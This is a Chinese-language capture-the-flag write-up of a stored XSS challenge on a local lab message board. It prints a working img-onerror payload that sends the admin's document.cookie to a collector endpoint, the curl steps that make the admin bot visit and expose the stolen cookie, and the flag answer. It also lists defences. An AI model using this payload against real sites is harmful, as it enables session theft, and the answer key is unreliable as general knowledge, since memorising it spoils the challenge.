# Writeup ④ XSS 偷管理员 cookie（150 分）

## 题目
留言板 `POST /c4/msg` 会把内容原样渲染；`POST /c4/report` 会「请管理员来看
一眼」。管理员的 cookie 里藏着 flag。

## 思路
典型的存储型 XSS + 机器人场景：注入一段在受害者浏览器里执行的脚本，把
`document.cookie` 外带到我们能读的地方（平台自带收集器 `/c4/exfil`）。

## 步骤
```bash
# 1) 注入外带脚本：图片加载失败时执行 onerror
curl -s -X POST http://127.0.0.1:8930/c4/msg \
  --data-urlencode "msg=<img src=x onerror=\"fetch('/c4/exfil?c='+encodeURIComponent(document.cookie))\">"

# 2) 请管理员来看（服务端会启动无头浏览器，带 admin_session 打开留言页）
curl -s -X POST http://127.0.0.1:8930/c4/report
# → {"result":"admin-visited"}

# 3) 读取被外带的 cookie，URL 解码后取 flag
curl -s http://127.0.0.1:8930/c4/stolen
```

## 关键点
- 页面不做转义（`<div>{msg}</div>` 直接插原始 HTML）→ 脚本在管理员域内执行。
- 机器人用无头 Chrome 真实打开页面——脚本真的在浏览器里跑，不是模拟。
- 防御：输出编码（转义 `<>&"'`）、CSP、cookie 加 HttpOnly（就算被 XSS，
  脚本也读不到 document.cookie——本实验特意不加，方便教学）。
- 结果：`HOSEC29{adm1n_c00k13_st0l3n}`

## 答案
`HOSEC29{adm1n_c00k13_st0l3n}`
